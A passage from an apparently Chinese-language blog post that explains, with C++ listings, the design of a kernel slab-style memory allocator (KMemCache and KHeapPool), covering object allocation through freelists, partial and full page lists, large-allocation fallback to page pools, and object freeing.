cpu 独占的 <code>KMemCacheCPU</code> ），等到后期如果笔者还有精力再行优化：）</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* size-specific memory pool, front end of PagePool */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KMemCache</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KMemCache</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KMemCache</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">AddPool</span><span class="hljs-params">(PagePool *pool)</span> -&gt; <span class="hljs-type">bool</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">RemovePool</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> index)</span> -&gt; PagePool*</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">/* pages pool backend */</span><br><br>    PagePool *pools[CACHE_POOL_MAX_NR];<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br>    base::<span class="hljs-type">size_t</span> order;<br><br>    <span class="hljs-keyword">auto</span> __internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*;<br>    <span class="hljs-keyword">auto</span> __page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* caches front end */</span><br><br>    base::<span class="hljs-type">size_t</span> page_obj_nr;<br>    base::<span class="hljs-type">size_t</span> obj_sz;<br>    Page *current;<br>    lib::ListHead partial;<br>    lib::ListHead full;<br>    <span class="hljs-type">void</span> **freelist;<br><br>    <span class="hljs-keyword">auto</span> __internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*;<br>    <span class="hljs-keyword">auto</span> __internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span>;<br><br>    <span class="hljs-comment">/* infrastructure */</span><br><br>    lib::atomic::SpinLock lock;<br>&#125;;<br><br><br><span class="hljs-keyword">enum</span> &#123;<br>    KOBJECT_16 = <span class="hljs-number">0</span>,<br>    KOBJECT_32,<br>    KOBJECT_64,<br>    KOBJECT_128,<br>    KOBJECT_192,<br>    KOBJECT_256,<br>    KOBJECT_512,<br>    KOBJECT_1K,<br>    KOBJECT_2K,<br>    KOBJECT_4K,<br>    KOBJECT_8K, <span class="hljs-comment">/* max allocation for 2 pages */</span><br>    NR_KOBJECT_SIZE,<br>&#125;;<br><br><span class="hljs-comment">/* static memory initializer to avoid constructor to be existed */</span><br>base::<span class="hljs-type">uint8_t</span> GloblKMemCacheGroupMem[KOBJECT_SIZE_NR][<span class="hljs-built_in">sizeof</span>(KMemCache)];<br>KMemCache *GloblKMemCacheGroup[KOBJECT_SIZE_NR] = &#123;<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_16],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_32],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_64],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_128],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_192],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_256],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_512],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_1K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_2K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_4K],<br>    (KMemCache*) &amp;GloblKMemCacheGroupMem[KOBJECT_8K],<br>&#125;;<br></code></pre></td></tr></table></figure><p>简而言之，我们的 <code>KMemCache</code> 结构如下图所示：</p><p><img src="https://s2.loli.net/2024/10/08/uBOt6eP3zULygbW.png"></p><p>我们在内存管理模块初始化时进行内存池的初始化：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Init</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> obj_sz)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;pools[i] = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;pool_nr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">this</span>-&gt;order = obj_sz &gt;&gt; PAGE_SHIFT;<br>    <span class="hljs-keyword">if</span> (obj_sz &gt;= PAGE_SIZE) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;order++;<br>    &#125;<br><br>    <span class="hljs-keyword">this</span>-&gt;obj_sz = obj_sz;<br>    <span class="hljs-keyword">this</span>-&gt;page_obj_nr = (PAGE_SIZE &lt;&lt; <span class="hljs-keyword">this</span>-&gt;order) / <span class="hljs-keyword">this</span>-&gt;obj_sz;<br><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial);<br>    lib::<span class="hljs-built_in">list_head_init</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full);<br>    <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Reset</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">kheap_pool_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; KOBJECT_SIZE_NR; i++) &#123;<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">Init</span>(kobj_default_size[i]);<br>        GloblKMemCacheGroup[i]-&gt;<span class="hljs-built_in">AddPool</span>(GloblPagePool);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><h2 id="内存对象分配策略"><a href="#内存对象分配策略" class="headerlink" title="内存对象分配策略"></a>内存对象分配策略</h2><p>首先是内存对象的分配，我们按照单次请求的大小将请求分为两类：</p><ul><li>对于小于内存池组最大大小的内存请求，我们将请求大小向上对齐到最近的内存池对象大小，从中进行分配</li><li>对于大于内存池组最大大小的内存请求，我们将其对齐到 <code>(2 ^ N) * PAGE_SIZE</code> 大小，从 buddy system 进行页面分配请求</li><li>我们使用从 buddy system 分配的一份页面的首个 <code>Page</code> 结构体的 <code>Page::kc</code> 字段标识其是否属于某个 <code>KMemCache</code> ，从而区分这两类内存分配</li></ul><p>在 <code>KMemCache</code> 与 <code>PagePool</code> 之上，我们再包装一层 <code>KHeapPool</code> 结构体作为内存分配的前端，用于隐藏背后的分配细节：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* General front end of KMemCache */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KHeapPool</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">KHeapPool</span>(<span class="hljs-type">void</span>);<br>    ~<span class="hljs-built_in">KHeapPool</span>();<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageAlloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> order)</span> -&gt; Page*</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">PageFree</span><span class="hljs-params">(Page *p)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">Init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetKMemCaches</span><span class="hljs-params">(KMemCache **caches, base::<span class="hljs-type">size_t</span> cache_nr, base::<span class="hljs-type">size_t</span> *cache_obj_sizes)</span> -&gt; <span class="hljs-type">void</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">SetPagePools</span><span class="hljs-params">(PagePool **pools, base::<span class="hljs-type">size_t</span> pool_nr)</span> -&gt; <span class="hljs-type">void</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    KMemCache **caches;<br>    base::<span class="hljs-type">size_t</span> cache_nr;<br>    base::<span class="hljs-type">size_t</span> *cache_obj_sizes;<br><br>    <span class="hljs-keyword">auto</span> __malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br><br>    PagePool **pools;<br>    base::<span class="hljs-type">size_t</span> pool_nr;<br><br>    <span class="hljs-keyword">auto</span> __malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Malloc</span><span class="hljs-params">(base::<span class="hljs-type">size_t</span> size)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__malloc_caches(size);<br>    <span class="hljs-keyword">if</span> (!obj) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;__malloc_pools(size);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KHeapPool::__malloc_caches(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;cache_nr; i++) &#123;<br>        <span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-keyword">this</span>-&gt;cache_obj_sizes[i]) &#123;<br>            obj = <span class="hljs-keyword">this</span>-&gt;caches[i]-&gt;<span class="hljs-built_in">Malloc</span>();<br>            <span class="hljs-keyword">if</span> (obj) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-小对象分配：当前-slub-partial-list-PagePool"><a href="#I-小对象分配：当前-slub-partial-list-PagePool" class="headerlink" title="I. 小对象分配：当前 slub -&gt; partial list -&gt; PagePool"></a>I. 小对象分配：当前 slub -&gt; partial list -&gt; PagePool</h3><p>对于比较常见的小对象内存分配，我们的策略如下：</p><ul><li>首先向上对齐分配大小，检查对应内存池的当前 freelist 是否仍有对象，若是则直接分配并返回</li><li>若否，检查当前是否有 slub page，若是则将其挂到 full list</li><li>检查 partial list 是否仍有空闲内存页，若是则取下并分配为当前 slub page 并回到第一步重新开始分配</li><li>若 partial list 也为空，向 PagePool 请求内存页，成功则回到第一步重新开始分配，失败则直接返回 NULL</li></ul><p>需要注意的是在我们的设计中内存池应当在多个核之间进行共享，因此所有操作需要全程加锁</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_alloc(<span class="hljs-type">void</span>) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    <span class="hljs-type">void</span> *obj = <span class="hljs-literal">nullptr</span>;<br><br>redo:<br>    <span class="hljs-comment">/* we have objects on the kmem_cache now, just allocate one */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;freelist != <span class="hljs-literal">nullptr</span>) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) (*<span class="hljs-keyword">this</span>-&gt;freelist);<br>        <span class="hljs-keyword">this</span>-&gt;current-&gt;obj_nr--;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">/* no object on freelist, put the current page on the full list */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        lib::<span class="hljs-built_in">list_add_next</span>(&amp;<span class="hljs-keyword">this</span>-&gt;full, &amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/* try to get the page from partial list */</span><br>    <span class="hljs-keyword">if</span> (!lib::<span class="hljs-built_in">list_empty</span>(&amp;<span class="hljs-keyword">this</span>-&gt;partial)) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;current = lib::<span class="hljs-built_in">container_of</span>(<span class="hljs-keyword">this</span>-&gt;partial.next, &amp;Page::list);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        lib::<span class="hljs-built_in">list_del</span>(&amp;<span class="hljs-keyword">this</span>-&gt;current-&gt;list);<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>    <span class="hljs-comment">/* no current on the partial list, allocated from the buddy */</span><br>    <span class="hljs-keyword">this</span>-&gt;current = <span class="hljs-keyword">this</span>-&gt;__internal_page_alloc();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;__page_obj_slicing(<span class="hljs-keyword">this</span>-&gt;current);<br>        <span class="hljs-keyword">this</span>-&gt;freelist = <span class="hljs-keyword">this</span>-&gt;current-&gt;freelist;<br>        <span class="hljs-keyword">goto</span> redo;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_page_alloc(<span class="hljs-type">void</span>) -&gt; Page*<br>&#123;<br>    Page *new_page = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; CACHE_POOL_MAX_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;pools[i]) &#123;<br>            new_page = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(<span class="hljs-keyword">this</span>-&gt;order);<br>            <span class="hljs-keyword">if</span> (new_page) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> new_page;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Malloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *obj;<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    obj = <span class="hljs-keyword">this</span>-&gt;__internal_obj_alloc();<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><p>在进行新的 slub pages 分配时，我们应当根据当前内存池信息将其分割为相应数量的空闲对象，并将空闲对象链接为单向链表：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KMemCache::__page_obj_slicing(Page* page) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    <span class="hljs-type">void</span> *curr_obj;<br>    <span class="hljs-type">virt_addr_t</span> next_obj;<br>    <span class="hljs-type">void</span> **obj_ptr;<br><br>    next_obj = <span class="hljs-built_in">page_to_virt</span>(page);<br>    curr_obj = <span class="hljs-literal">nullptr</span>;<br>    obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;page_obj_nr; i++) &#123;<br>        *obj_ptr = curr_obj;<br>        curr_obj = (<span class="hljs-type">void</span>*) next_obj;<br>        next_obj += <span class="hljs-keyword">this</span>-&gt;obj_sz;<br>        obj_ptr = (<span class="hljs-type">void</span>**) next_obj;<br>    &#125;<br><br>    page-&gt;obj_nr = <span class="hljs-keyword">this</span>-&gt;page_obj_nr;<br>    page-&gt;freelist = (<span class="hljs-type">void</span>**) curr_obj;<br>    page-&gt;kc = <span class="hljs-keyword">this</span>;<br>    <span class="hljs-built_in">get_page</span>(page);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-大内存分配：退化至-PagePool"><a href="#II-大内存分配：退化至-PagePool" class="headerlink" title="II. 大内存分配：退化至 PagePool"></a>II. 大内存分配：退化至 PagePool</h3><p>对于较大的内存分配，KMemCache 会直接拒绝请求，此时在 KHeapPool 的分配前端中会回退到 PagePool 进行分配：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> KHeapPool::__malloc_pools(base::<span class="hljs-type">size_t</span> size) -&gt; <span class="hljs-type">void</span>*<br>&#123;<br>    base::<span class="hljs-type">size_t</span> order = <span class="hljs-number">0</span>, need = size;<br>    Page *obj;<br><br>    size &gt;&gt;= (PAGE_SHIFT + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        order++;<br>        size &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (((<span class="hljs-number">1</span> &lt;&lt; order) * PAGE_SIZE) &lt; need) &#123;<br>        order++;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>-&gt;pool_nr; i++) &#123;<br>        obj = <span class="hljs-keyword">this</span>-&gt;pools[i]-&gt;<span class="hljs-built_in">AllocPages</span>(order);<br>        <span class="hljs-keyword">if</span> (obj) &#123;<br>            <span class="hljs-built_in">get_page</span>(obj);<br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*) <span class="hljs-built_in">page_to_virt</span>(obj);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* we failed unexpectedly :( */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="内存对象释放：对象回归与链表迁移"><a href="#内存对象释放：对象回归与链表迁移" class="headerlink" title="内存对象释放：对象回归与链表迁移"></a>内存对象释放：对象回归与链表迁移</h2><p>内存释放的逻辑则简单得多：</p><ul><li>首先根据虚拟地址找到对应的 page 结构体，若不属于任一 <code>KMemCache</code> 则说明为大内存分配，直接释放回所属  <code>PagePool</code></li><li>否则，找到其对应的 <code>KMemCache</code> ，判断当前 slub page 所属：<ul><li>若为正在使用的 slub page，直接将对象挂回 <code>KMemCache::freelist</code></li><li>否则，挂回对应 page 的 freelist，若为 full list 则迁移至 partial list</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KHeapPool::Free</span><span class="hljs-params">(<span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    Page *page;<br><br>    page = <span class="hljs-built_in">get_head_page</span>(<span class="hljs-built_in">virt_to_page</span>((<span class="hljs-type">virt_addr_t</span>) obj));<br>    <span class="hljs-keyword">if</span> (!page-&gt;kc) &#123;<br>        <span class="hljs-built_in">put_page</span>(page);<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    page-&gt;kc-&gt;<span class="hljs-built_in">Free</span>(page, obj);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">KMemCache::Free</span><span class="hljs-params">(Page *page, <span class="hljs-type">void</span> *obj)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">Lock</span>();<br><br>    <span class="hljs-keyword">this</span>-&gt;__internal_obj_free(page, obj);<br><br>    <span class="hljs-keyword">this</span>-&gt;lock.<span class="hljs-built_in">UnLock</span>();<br>&#125;<br><br><span class="hljs-keyword">auto</span> KMemCache::__internal_obj_free(Page *page, <span class="hljs-type">void</span> *obj) -&gt; <span class="hljs-type">void</span><br>&#123;<br>    page-&gt;obj_nr++;<br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-keyword">this</span>-&gt;current) &#123;<br>        *(<span class="hljs-type">void</span>**) obj = <span class="hljs-keyword">this</span>-&gt;freelist;<br>        <span class="hljs-keyword">this</span>-&gt;freelist = (<span class="hljs-type">void</span>**) obj;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (page-&gt;obj_nr == <span 